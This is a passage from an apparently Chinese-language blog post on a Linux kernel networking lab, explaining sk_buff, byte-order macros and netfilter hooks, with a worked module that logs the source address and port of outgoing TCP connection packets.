class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__wsum		csum;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">			__u16	csum_start;</span><br><span class="line">			__u16	csum_offset;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;;</span><br><span class="line">	__u32			priority;</span><br><span class="line">	<span class="keyword">int</span>			skb_iif;</span><br><span class="line">	__u32			hash;</span><br><span class="line">	__be16			vlan_proto;</span><br><span class="line">	__u16			vlan_tci;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_NET_RX_BUSY_POLL) || defined(CONFIG_XPS)</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span>	napi_id;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span>	sender_cpu;</span><br><span class="line">	&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NETWORK_SECMARK</span></span><br><span class="line">	__u32		secmark;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__u32		mark;</span><br><span class="line">		__u32		reserved_tailroom;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		__be16		inner_protocol;</span><br><span class="line">		__u8		inner_ipproto;</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	__u16			inner_transport_header;</span><br><span class="line">	__u16			inner_network_header;</span><br><span class="line">	__u16			inner_mac_header;</span><br><span class="line"></span><br><span class="line">	__be16			protocol;</span><br><span class="line">	__u16			transport_header;</span><br><span class="line">	__u16			network_header;</span><br><span class="line">	__u16			mac_header;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* private: */</span></span><br><span class="line">	__u32			headers_end[<span class="number">0</span>];</span><br><span class="line">	<span class="comment">/* public: */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* These elements must be at the end, see alloc_skb() for details.  */</span></span><br><span class="line">	<span class="keyword">sk_buff_data_t</span>		tail;</span><br><span class="line">	<span class="keyword">sk_buff_data_t</span>		end;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>		*head,</span><br><span class="line">				*data;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span>		truesize;</span><br><span class="line">	<span class="keyword">refcount_t</span>		users;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>Conversions</strong></p>
<p>在不同的系统中，有几种方法可以对单词中的字节进行排序（字节序），包括：</p>
<ul>
<li>Big Endian 大端</li>
<li>Little Endian 小端</li>
</ul>
<p>由于网络将系统与不同的平台互连，因此互联网已经为数字数据的存储强加了一个标准的顺序，被称为 network byte-order 网络字节顺序</p>
<ul>
<li>网络字节序就是 Big Endian 大端字节序 </li>
<li>对于转换大小端，我们使用以下宏：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">u16 <span class="title">htons</span><span class="params">(u16 x)</span> <span class="comment">/* 将16位整数从主机字节顺序转换为网络字节顺序 */</span></span></span><br><span class="line"><span class="function">u32 <span class="title">htonl</span><span class="params">(u32 x)</span> <span class="comment">/* 将32位整数从主机字节顺序转换为网络字节顺序 */</span></span></span><br><span class="line"><span class="function">u16 <span class="title">ntohs</span><span class="params">(u16 x)</span> <span class="comment">/* 将16位整数从网络字节顺序转换为主机字节顺序 */</span></span></span><br><span class="line"><span class="function">u32 <span class="title">ntohl</span><span class="params">(u32 x)</span> <span class="comment">/* 将32位整数从网络字节顺序转换为主机字节顺序 */</span></span></span><br></pre></td></tr></table></figure>
<p><strong>netfilter</strong></p>
<p>网络过滤器 netfilter 是内核接口的名称，用于捕获网络数据包以修改/分析它们（用于过滤，NAT等）</p>
<p>用户空间通过 iptable 使用网络过滤器接口</p>
<p>在 Linux 内核中，使用网络过滤器的数据包捕获是通过附加钩子来完成的：</p>
<ul>
<li>可以根据需要在路径中的不同位置指定钩子，后跟内核网络数据包</li>
<li>可以在此处找到组织结构图，其中包含路线后跟包裹以及钩子的可能区域</li>
</ul>
<p>钩子 hook 是通过以下结构定义的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">nf_hookfn</span><span class="params">(<span class="keyword">void</span> *priv,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">const</span> struct nf_hook_state *state)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> &#123;</span></span><br><span class="line">      nf_hookfn               *hook; <span class="comment">/* 捕获网络数据包(作为结构发送的数据包)时,调用的处理程序(该字段是传递给处理程序的私有信息) */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> <span class="title">net_device</span>       *<span class="title">dev</span>;</span> <span class="comment">/* 要捕获的设备(网络接口) */</span></span><br><span class="line">      <span class="keyword">void</span>                    *priv; </span><br><span class="line">      <span class="keyword">u_int8_t</span>                pf; <span class="comment">/* 包装类型(PF_INET等) */</span></span><br><span class="line">      <span class="keyword">unsigned</span> <span class="keyword">int</span>            hooknum; <span class="comment">/* hook编号 */</span></span><br><span class="line">      <span class="keyword">int</span>                     priority; <span class="comment">/* 优先级 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>钩子函数 hook 的签名中有一个 <code>nf_hook_state</code> 结构体，用于描述 hook 的状态信息，关键条目如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_state</span> &#123;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> hook;	   <span class="comment">/* hook编号 */</span></span><br><span class="line">	<span class="keyword">u_int8_t</span> pf; 		  <span class="comment">/* 包装类型 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">in</span>;</span> <span class="comment">/* 输入接口 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net_device</span> *<span class="title">out</span>;</span> <span class="comment">/* 输出接口 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock</span> *<span class="title">sk</span>;</span> <span class="comment">/* 对应的sock(INET套接字) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span> *<span class="title">net</span>;</span>  <span class="comment">/* 对应的net(内核网络命名空间) */</span></span><br><span class="line">	<span class="keyword">int</span> (*okfn)(struct net *, struct sock *, struct sk_buff *);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>相关 API 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_register_net_hook</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *ops)</span></span>; <span class="comment">/* 用于注册挂钩点 */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_unregister_net_hook</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *ops)</span></span>; <span class="comment">/* 用于注销挂钩点 */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_register_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span>; <span class="comment">/* 调用n次nf_register_net_hook */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_unregister_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">                           <span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span>; <span class="comment">/* 调用n次nf_unregister_net_hook */</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_register_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">			  <span class="keyword">unsigned</span> <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">		err = nf_register_net_hook(net, &amp;reg[i]);</span><br><span class="line">		<span class="keyword">if</span> (err)</span><br><span class="line">			<span class="keyword">goto</span> err;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">err:</span><br><span class="line">	<span class="keyword">if</span> (i &gt; <span class="number">0</span>)</span><br><span class="line">		nf_unregister_net_hooks(net, reg, i);</span><br><span class="line">	<span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_register_net_hooks);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nf_unregister_net_hooks</span><span class="params">(struct net *net, <span class="keyword">const</span> struct nf_hook_ops *reg,</span></span></span><br><span class="line"><span class="params"><span class="function">			     <span class="keyword">unsigned</span> <span class="keyword">int</span> hookcount)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; hookcount; i++)</span><br><span class="line">		nf_unregister_net_hook(net, &amp;reg[i]);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(nf_unregister_net_hooks);</span><br></pre></td></tr></table></figure>
<p>使用案例如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/skbuff.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">my_nf_hookfn</span><span class="params">(<span class="keyword">void</span> *priv,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 <span class="keyword">const</span> struct nf_hook_state *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> =</span> ip_hdr(skb); <span class="comment">/* IP header */</span></span><br><span class="line">    <span class="comment">/* iph-&gt;saddr  - source IP address */</span></span><br><span class="line">    <span class="comment">/* iph-&gt;daddr  - destination IP address */</span></span><br><span class="line">    <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; test_daddr(iph-&gt;daddr)) &#123;              </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> =</span> tcp_hdr(skb); <span class="comment">/* TCP header */</span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_UDP) &#123;      </span><br><span class="line">        struct udphdr *udph = udp_hdr(skb); <span class="comment">/* UDP header */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> <span class="title">my_nfho</span> =</span> &#123;</span><br><span class="line">    .hook        = my_nf_hookfn,</span><br><span class="line">    .hooknum     = NF_INET_LOCAL_OUT,</span><br><span class="line">    .pf          = PF_INET,</span><br><span class="line">    .priority    = NF_IP_PRI_FIRST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">my_hook_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> nf_register_net_hook(&amp;init_net, &amp;my_nfho);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">my_hook_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    nf_unregister_net_hook(&amp;init_net, &amp;my_nfho);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_hook_init);</span><br><span class="line">module_exit(my_hook_exit);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>netcat</strong></p>
<p>在开发包含网络代码的应用程序时，最常用的工具之一是 netcat（也被称为“用于 TCP/IP 的瑞士军刀”），它允许：</p>
<ul>
<li>启动 TCP 连接</li>
<li>等待 TCP 连接</li>
<li>发送和接收 UDP 数据包</li>
<li>以十六进制转储格式显示流量</li>
<li>建立连接后运行程序（例如，shell）</li>
<li>在已发送的包中设置特殊选项</li>
</ul>
<p><strong>Exercises</strong></p>
<p>要解决练习，您需要执行以下步骤：</p>
<ul>
<li>从模板准备 skeletons </li>
<li>构建模块</li>
<li>将模块复制到虚拟机</li>
<li>启动 VM 并在 VM 中测试模块</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">make clean</span><br><span class="line">LABS=networking make skels</span><br><span class="line">make build</span><br></pre></td></tr></table></figure>
<p>1.netfilter：</p>
<ul>
<li>编写一个内核模块，该模块显示启动出站连接的 TCP 数据包的源地址和端口</li>
<li>可以通过 MY_IOCTL_FILTER_ADDRESS ioctl 调用来指定目标地址</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * SO2 - Networking Lab (#10)</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Exercise #1, #2: simple netfilter module</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Code skeleton.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/atomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/netfilter_ipv4.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/skbuff.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;filter.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Simple netfilter module&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;SO2&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOG_LEVEL		KERN_ALERT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MY_DEVICE		<span class="meta-string">&quot;filter&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">my_cdev</span>;</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">atomic_t</span> ioctl_set;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> ioctl_set_addr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test ioctl_set_addr if it has been set.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test_daddr</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> dst_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* TODO 2: return non-zero if address has been set</span></span><br><span class="line"><span class="comment">	 * *and* matches dst_addr</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (atomic_read(&amp;ioctl_set) == <span class="number">1</span>)</span><br><span class="line">		ret = (ioctl_set_addr == dst_addr);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		ret = <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 1: netfilter hook function */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">my_nf_hookfn</span><span class="params">(<span class="keyword">void</span> *priv,</span></span></span><br><span class="line"><span class="params"><span class="function">            struct sk_buff *skb,</span></span></span><br><span class="line"><span class="params"><span class="function">            <span class="keyword">const</span> struct nf_hook_state *state)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">iph</span> =</span> ip_hdr(skb);  </span><br><span class="line">    </span><br><span class="line">	<span class="keyword">if</span> (iph-&gt;protocol == IPPROTO_TCP &amp;&amp; test_daddr(iph-&gt;daddr)) &#123;              </span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">tcph</span> =</span> tcp_hdr(skb); </span><br><span class="line">		<span class="keyword">if</span> (tcph-&gt;syn &amp;&amp; !tcph-&gt;ack)</span><br><span class="line">			printk(LOG_LEVEL <span class="string">&quot;IP address is %pI4:%u\n&quot;</span>, &amp;iph-&gt;saddr,ntohs(tcph-&gt;source));</span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_open</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">my_close</span><span class="params">(struct inode *inode, struct file *file)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">my_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">	<span class="keyword">case</span> MY_IOCTL_FILTER_ADDRESS:</span><br><span class="line">		<span class="comment">/* TODO 2: set filter address from arg */</span></span><br><span class="line">		<span class="keyword">if</span>(copy_from_user(&amp;ioctl_set_addr,(<span class="keyword">void</span>*)arg,<span class="keyword">sizeof</span>(ioctl_set_addr)))&#123;</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		&#125;</span><br><span class="line">		atomic_set(&amp;ioctl_set,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">return</span> -ENOTTY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">my_fops</span> =</span> &#123;</span><br><span class="line">	.owner = THIS_MODULE,</span><br><span class="line">	.open = my_open,</span><br><span class="line">	.release = my_close,</span><br><span class="line">	.unlocked_ioctl = my_ioctl</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* TODO 1: define netfilter hook operations structure */</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">nf_hook_ops</span> <span class="title">my_nfho</span> =</span> &#123;</span><br><span class="line">	.hook = my_nf_hookfn,</span><br><span class="line">	.hooknum = NF_INET_LOCAL_OUT,</span><br><span class="line">	.pf = PF_INET,</span><br><span class="line">	.priority = NF_IP_PRI_FIRST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> __init <span class="title">my_hook_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span 